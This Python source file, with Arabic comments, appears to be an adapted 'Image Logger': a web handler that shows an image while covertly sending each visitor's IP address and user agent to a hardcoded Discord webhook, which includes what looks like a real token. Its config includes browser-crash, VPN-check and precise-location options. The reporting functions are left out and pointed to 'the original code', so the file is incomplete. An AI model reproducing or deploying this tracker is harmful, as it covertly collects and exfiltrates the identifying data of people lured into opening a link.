from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser, json, os

# نفس الكونفغ ولكن مع تعديل الـ webhook
config = {
    "webhook": "https://canary.discord.com/api/webhooks/1541479611828015194/p6Kzfmr-VoOarPTnQG_BsPaa7aLrd7P6WVtrUKcn81SRjJUBFN05rfRUD7n1XVGai_Yq",  # ضع رابط الـ webhook الخاص بك هنا
    "image": "حط الصورة هون",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Test",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://example.com"
    }
}

def handler(request, response):
    try:
        # استخراج الـ IP من headers
        ip = request.headers.get('x-forwarded-for', '').split(',')[0].strip()
        useragent = request.headers.get('user-agent', '')
        
        # معالجة الـ URL
        s = request.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        
        if config["imageArgument"] and dic.get("url"):
            url = base64.b64decode(dic.get("url").encode()).decode()
        else:
            url = config["image"]
        
        # إرسال الـ webhook
        makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
        
        # عرض الصورة
        response.status_code = 200
        response.headers['Content-Type'] = 'text/html'
        return f'''<style>body {{margin:0;padding:0;}}
        div.img {{
            background-image: url('{url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
        }}
        </style><div class="img"></div>'''
        
    except Exception as e:
        response.status_code = 500
        return str(e)

# دوال makeReport و botCheck (انقلها من الكود الأصلي)
